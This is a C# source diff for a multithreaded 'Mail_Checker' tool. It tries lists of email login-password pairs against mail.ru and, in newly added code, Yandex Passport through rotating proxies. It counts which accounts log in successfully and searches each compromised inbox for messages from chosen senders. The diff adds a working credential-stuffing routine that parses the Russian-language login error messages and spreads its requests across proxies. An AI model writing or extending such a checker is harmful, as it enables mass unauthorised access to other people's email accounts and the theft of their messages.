@@ -66,7 +66,7 @@ namespace Mail_Checker
             List<Thread> threadsList = new List<Thread>();
 
 
-            for (int i = 0; i < threads; i++)
+            for (int i = 0; i < threads && i<1001; i++)
             {
                 Thread t = new Thread(new ThreadStart(Check));
                 t.Start();
@@ -82,7 +82,7 @@ namespace Mail_Checker
 
         Random r = new Random();
 
-        void Check(/*object e*/)
+        void Check()
         {
 
             workingThreads++;
@@ -113,7 +113,7 @@ namespace Mail_Checker
                 string[] proxyElements = proxyLine.proxy.Split(separs);
 
                 if (proxyElements.Length != 2 || Regex.Matches(proxyElements[0], "((25[0-5]|2[0-4]\\d|[01]?\\d\\d?)\\.){3}(25[0-5]|2[0-4]\\d|[01]?\\d\\d?)").Count == 0 ||
-                    Regex.Matches(proxyElements[1], "^[0-9]*$").Count == 0)
+                    Regex.Matches(proxyElements[1], "^[0-9]*$").Count == 0 || Convert.ToInt32(proxyElements[1]) < 0 || Convert.ToInt32(proxyElements[1]) > Int32.MaxValue)
                 {
                     mails.Push(mailLine);
                     continue;
@@ -125,7 +125,7 @@ namespace Mail_Checker
                 CheckErrors error = CheckErrors.noError;
 
                 if (serv == "imap.mail.ru") MailRuCheck(mailElements, proxyElements, out messages, out error);
-                //else if (serv == "imap.yandex.ru") YandexCheck(mailElements, proxyElements, out messNum, out error);
+                else if (serv == "imap.yandex.ru") YandexCheck(mailElements, proxyElements, out messages, out error);
                 else
                 {
                     proxys.Enqueue(proxyLine);
@@ -142,7 +142,7 @@ namespace Mail_Checker
                 else if (error == CheckErrors.noError)
                 {
                     valid++;
-                    proxyLine.stats=5;
+                    proxyLine.stats+=5;
                     proxys.Enqueue(proxyLine);
                 }
                 else if (error == CheckErrors.mailError)
@@ -287,6 +287,107 @@ namespace Mail_Checker
                         }
 
                         
+
+                    }
+                }
+
+            }
+            catch (HttpException)
+            {
+                error = CheckErrors.proxyError;
+            }
+            catch (ArgumentException)
+            {
+                error = CheckErrors.proxyError;
+            }
+
+
+        }
+
+
+        private void YandexCheck(string[] mailElements, string[] proxyElements, out int[] messages, out CheckErrors error)
+        {
+
+
+            messages = new int[querys.Length];
+            for (int i = 0; i < messages.Length; i++)
+            {
+                messages[i] = 0;
+            }
+
+            error = CheckErrors.noError;
+
+
+            try
+            {
+
+
+                HttpProxyClient proxy = new HttpProxyClient(proxyElements[0], Convert.ToInt32(proxyElements[1]));
+                CookieDictionary cookies = new CookieDictionary();
+
+                HttpRequest req1 = new HttpRequest();
+                req1.Proxy = proxy;
+                req1.Cookies = cookies;
+                req1.ConnectTimeout = timeout * 1000;
+                req1.AddParam("login", mailElements[0]);
+                req1.AddParam("passwd", mailElements[1]);
+                req1.AddParam("retpath", "https://mail.yandex.ru");
+                
+                HttpResponse res1 = req1.Post("https://passport.yandex.ru/passport?mode=auth&from=mail&origin=hostroot_new_l_enter&retpath=https://mail.yandex.ru");
+
+                string res1str = res1.ToString();
+
+
+                if (res1str.Contains("Ошибка проверки контрольных символов"))
+                {
+                    error = CheckErrors.anotherError;
+                    return;
+                }
+                else if (res1str.Contains("Ваш аккаунт временно заблокирован") || res1str.Contains("Неправильная пара логин-пароль"))
+                {
+                    error = CheckErrors.mailError;
+                    return;
+                }
+                else if (!res1str.Contains("Яндекс.Почта"))
+                {
+                    error = CheckErrors.proxyError;
+                    return;
+                }
+
+
+                for (int i = 0; i < querys.Length; i++)
+                {
+
+                    HttpRequest req2 = new HttpRequest();
+                    req2.Proxy = proxy;
+                    req2.Cookies = cookies;
+                    req2.ConnectTimeout = timeout * 1000;
+                    req2.AddParam("_handlers", "messages");
+                    req2.AddParam("search", "yes");
+                    req2.AddParam("scope", "hdr_from");
+                    req2.AddParam("request", querys[i]);
+                    req2.AddParam("_page", "messages");
+                    req2.AddParam("_service", "mail");
+                    req2.AddParam("_locale", "ru");
+                    req2.AddHeader("X-Requested-With", "XMLHttpRequest");
+
+                    HttpResponse res2 = req2.Post("https://mail.yandex.ru/neo2/handlers/handlers3.jsx?_h=messages");
+
+                    string res2str = res2.ToString();
+
+                    if (!res2str.Contains("handlers"))
+                    {
+                        error = CheckErrors.proxyError;
+                        return;
+                    }
+                    else if (res2str=="")
+                    {
+                        throw new NotImplementedException();
+                    }
+                    else
+                    {
+                        MatchCollection col = Regex.Matches(res2str, "\"type\":\"from\"");
+                        messages[i] = col.Count;
 
                     }
                 }
